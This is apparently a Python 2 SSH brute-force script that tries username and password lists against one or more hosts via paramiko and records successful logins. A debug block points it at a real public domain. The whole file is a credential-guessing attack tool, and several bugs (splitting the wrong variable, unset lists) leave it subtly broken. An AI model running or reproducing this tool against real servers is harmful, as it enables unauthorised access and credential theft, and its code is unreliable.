import paramiko
import threading
import re





rhost = None
lhost = '127.0.0.1'
port = None
passwd = None
passwdfile = None
username = None
userfile = None
userpass = None
rhostlist = None



debug = False

#debug
if debug == True:
    passwd = 'test'
    port = '23'
    username = 'test'
    rhost = 'baidu.com'




session = []



client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)

def exp(param):

    print str(param)

    for i in param.keys():
#        locals().keys().append(i)
        locals()[str(i)] = param[str(i)]
#        print locals()[i]

    lhost = param['lhost']
    rhost = param['rhost']
    rport = param['rport']
    username = param['username']
    password = param['password']
    port = param['port']
    userfile = param['userfile']
    passwdfile = param['passwordfile']
    userpass = param['userpass']

    if lhost == None:
        print '[!]522 No lhost'
        exit()
    if rhost == None:
        print '[*]523 No rhost'
        if rhostlist == None:
            print '[!]524 No target file.'
            pass
        else:
            try:
                file = open(str(rhostlist),'r')
                rawtext = file.read()
                rhost = re.split('\n',rawtext)
                if debug == True:
                    print '[#]500 debug' + str(rhost)
            except:
                print '[!]525 Failed to load target file'
                pass
    else:
        rhost = [rhost]
        pass

    if port == None:
        print '[!]524 No port,using default'
        port = 22

    if userpass == None:
        if passwd == None:
            if passwdfile == None:
                print '[!]524 No password'
            else:
                rawfile = open(passwdfile,'r')
                passtext = rawfile.read()
                password = re.split('\n',passtext)
        else:
            password = [passwd]
        if username == None:
            if userfile == None:
                print '[!]524 No username'
            else:
                file = open(userfile,'r')
                usertext = file.read()
                username = re.split('\n',username)
        else:
            username = [username]

    for user in username:
        for user_password in password:
            for ip in rhost:
                count = conn(ip,port,user,user_password)
#                if debug == True:
#                    print '[#]500 debug ' + ip + port + user + user_password
                if count == 531:
                    sessionstr = '{host:%s\nport:%s\nusername:%s\npassword:%s;}' %(ip,port,username,password)
                    session.append(sessionstr)
                else:
                    pass







def conn(host,port,username,passwd):
    try:
        print '[*]530 Trying %s:%s @ %s:%s' %(username,passwd,host,port)
        client.connect(host,port,username,passwd,timeout=5)
        print '[+]531 Connect success'
        client.close()
        return 531
    except:
        pass

